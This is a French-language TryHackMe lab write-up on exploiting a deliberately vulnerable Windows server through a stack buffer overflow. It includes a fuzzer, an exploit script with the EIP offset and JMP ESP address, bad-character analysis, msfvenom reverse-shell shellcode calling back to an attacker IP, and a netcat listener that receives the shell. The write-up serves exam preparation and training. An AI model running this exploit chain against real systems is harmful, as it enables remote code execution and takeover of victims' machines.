---
tags: [BOF, buffer overflows, cyber, OSCP, Tib3rius, tryhackme]
title: TryHackMe - OSCP BO Prep
created: '2020-08-19T07:07:45.245Z'
modified: '2020-08-19T08:50:51.858Z'
---

# TryHackMe - OSCP BO Prep

```sh
kali@kali:~$ rdesktop 10.10.164.9 -u admin -p password -k fr
```

https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

Lançons Immunity debugger en mode admin, puis ouvrons oscp.exe depuis Immunity. Il se lancera en mode pause. Lançons-le avec la flèche rouge.

```sh
Starting OSCP vulnserver version 1.00
Listening on port 1337.
Waiting for client connections...
```

Lançons alors netcat depuis kali :

```sh
kali@kali:~$ nc 10.10.164.9 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
HELP    
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT
```

## Mona configuration

Depuis le windows, on configure mona pour travailler dans un dossier :

```cmd
!mona config -set workingfolder c:\mona\%p
```

## Fuzzing

Voici notre Fuzzer :

```py
#Fuzzer.py
import socket, time, sys


# Socket info
ip = "10.10.164.9"
port = 1337
timeout = 5

# On veut buffer = ["A"*100, "A"*200, ... "A"*3000]
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

# Fuzzing
for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Lorsqu'on le lance, le programme crashe à partir de `2000` caractères envoyés :

```sh
kali@kali:~/Documents/BufferOverflow$ python fuzzer.py 
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Could not connect to 10.10.164.9:1337
```

## Crash Replication & Controlling EIP

Premièrement, on créer un script `exploit.py` : 

```py
import socket

ip = "10.10.164.9"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

On créee un pattern 400 caractères plus long que la chaîne de caractères qui a fait crasher l'app :

```sh
kali@kali:~/Documents/BufferOverflow$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9
```
On entre ce pattern dans la variable payload de `exploit.py` et on lance le script, ce qui va faire crasher le serveur.

Dans Immunity Debugger, on entre `!mona findmsp -distance 2400`, le nombre de caractères de la payload. On observe :

```sh
EIP contains normal pattern : 0x6f43396e (offset 1978)
```

On définit alors la variable `offset` de `exploit.py` à 1978, on vide la payload, et on définit `retn = "BBBB"`, qui devrait être écrite dans `EIP`.

On lance encore une fois `exploit.py`. Le serveur crashe, et dans Immunity, on devrait voir dans la fenêtre des registres (en haut à gauche) :

```sh
EIP 42424242
```

## Finding bad characters 

On demande à mona de construire un `bytearray` en excluant le caractère null `\x00` :

```sh
!mona bytearray -b "\x00"
```

Cette liste ce trouve dans `C:\mona\oscp\bytearray.txt` :

```sh
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

Une fonction python peut également faire l'affaire :

```py
# bytearray.py
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()
```

```sh
kali@kali:~/Documents/BufferOverflow$ python bytearray.py 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

On définit alors `payload` comme cette liste d'octets, et on relance `exploit.py`.

Dans Immunity, on regarde où ESP pointe : `01A2FA30`, et on entre :

```sh
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A2FA30
```

Cela va ouvrir une fenêtre qui nous donne tous les mauvais caractères :

```sh
mona Memory comparison results, item 0
 Address=0x01a2fa30
 Status=Corruption after 6 bytes
 BadChars=00 07 08 2e 2f a0 a1
 Type=normal
 Location=Stack
```

Remarque : les badchars peuvent affecter les octets suivants. Ainsi, probablement 08, 2f et a1 ne sont pas des badchars.

On regénère un bytearray avec mona : 

```sh
!mona bytearray -b "\x00\x07\x08\x2e\x2f\xa0\xa1"
```

Nouveau script pour générer les caractères :

```py
from __future__ import print_function


badchars = ['\\x00', '\\x07', '\\x08', '\\x2e', '\\x2f', '\\xa0', '\\xa1',]

for x in range(1, 256):
    char = "\\x" + "{:02x}".format(x)
    if not char in badchars:
        print(char, end='')

print()
```

```sh
kali@kali:~/Documents/BufferOverflow$ python bytearray.py 
\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

On relance `exploit.py`, et on recompare avec le bytearray de mona :

```sh
!mona compare -f C:\mona\oscp\bytearray.bin -a 
```

La fenêtre s'ouvre en indiquant `Unmodified`. Cela veut dire qu'il n'y a plus aucun mauvais caractère dans notre payload.

## Finding a Jump point

On cherche un endroit dans le code qui permet de jump vers l'`ESP` :

```sh
!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"
```

On trouve une addresse : `625011AF`, il faut l'écrire en little endian dans notre script : `retn = "\xAF\x11\x50\x62"`.

## Generate Payload

Grâce à `msfvenom` on génère la payload en excluant les badchars :

```sh
kali@kali:~/Documents/BufferOverflow$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.7.104 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f py
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xda\xd3\xd9\x74\x24\xf4\xb8\xbd\xf2\xa4\x48\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x42\x17\x03\x42\x17\x83\x7f\xf6\x46"
buf += b"\xbd\x83\x1f\x04\x3e\x7b\xe0\x69\xb6\x9e\xd1\xa9\xac"
buf += b"\xeb\x42\x1a\xa6\xb9\x6e\xd1\xea\x29\xe4\x97\x22\x5e"
buf += b"\x4d\x1d\x15\x51\x4e\x0e\x65\xf0\xcc\x4d\xba\xd2\xed"
buf += b"\x9d\xcf\x13\x29\xc3\x22\x41\xe2\x8f\x91\x75\x87\xda"
buf += b"\x29\xfe\xdb\xcb\x29\xe3\xac\xea\x18\xb2\xa7\xb4\xba"
buf += b"\x35\x6b\xcd\xf2\x2d\x68\xe8\x4d\xc6\x5a\x86\x4f\x0e"
buf += b"\x93\x67\xe3\x6f\x1b\x9a\xfd\xa8\x9c\x45\x88\xc0\xde"
buf += b"\xf8\x8b\x17\x9c\x26\x19\x83\x06\xac\xb9\x6f\xb6\x61"
buf += b"\x5f\xe4\xb4\xce\x2b\xa2\xd8\xd1\xf8\xd9\xe5\x5a\xff"
buf += b"\x0d\x6c\x18\x24\x89\x34\xfa\x45\x88\x90\xad\x7a\xca"
buf += b"\x7a\x11\xdf\x81\x97\x46\x52\xc8\xff\xab\x5f\xf2\xff"
buf += b"\xa3\xe8\x81\xcd\x6c\x43\x0d\x7e\xe4\x4d\xca\x81\xdf"
buf += b"\x2a\x44\x7c\xe0\x4a\x4d\xbb\xb4\x1a\xe5\x6a\xb5\xf0"
buf += b"\xf5\x93\x60\x56\xa5\x3b\xdb\x17\x15\xfc\x8b\xff\x7f"
buf += b"\xf3\xf4\xe0\x80\xd9\x9c\x8b\x7b\x8a\xa8\x40\x84\x22"
buf += b"\xc5\x54\x8a\xa3\x49\xd0\x6c\xa9\x61\xb4\x27\x46\x1b"
buf += b"\x9d\xb3\xf7\xe4\x0b\xbe\x38\x6e\xb8\x3f\xf6\x87\xb5"
buf += b"\x53\x6f\x68\x80\x09\x26\x77\x3e\x25\xa4\xea\xa5\xb5"
buf += b"\xa3\x16\x72\xe2\xe4\xe9\x8b\x66\x19\x53\x22\x94\xe0"
buf += b"\x05\x0d\x1c\x3f\xf6\x90\x9d\xb2\x42\xb7\x8d\x0a\x4a"
buf += b"\xf3\xf9\xc2\x1d\xad\x57\xa5\xf7\x1f\x01\x7f\xab\xc9"
buf += b"\xc5\x06\x87\xc9\x93\x06\xc2\xbf\x7b\xb6\xbb\xf9\x84"
buf += b"\x77\x2c\x0e\xfd\x65\xcc\xf1\xd4\x2d\xec\x13\xfc\x5b"
buf += b"\x85\x8d\x95\xe1\xc8\x2d\x40\x25\xf5\xad\x60\xd6\x02"
buf += b"\xad\x01\xd3\x4f\x69\xfa\xa9\xc0\x1c\xfc\x1e\xe0\x34"
```
Dans notre script, on met `payload = buf`.

## Prepends NOPs

Il faut des NOP avant la payload pour qu'elle puisse s'extraire (elle est probablement encodée à l'envoi). On fixe donc un padding de l'instruction `NOP`, soit `\x90` :

```py
padding = "\x90" * 16
```

## Exploit !

On ouvre un netcat listener sur le port 4444 spécifié à msfvenom :

```sh
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
```

On lance l'exploit, et un shell nous est donné :

```sh
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.11.7.104] from (UNKNOWN) [10.10.164.9] 49353
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>   
```
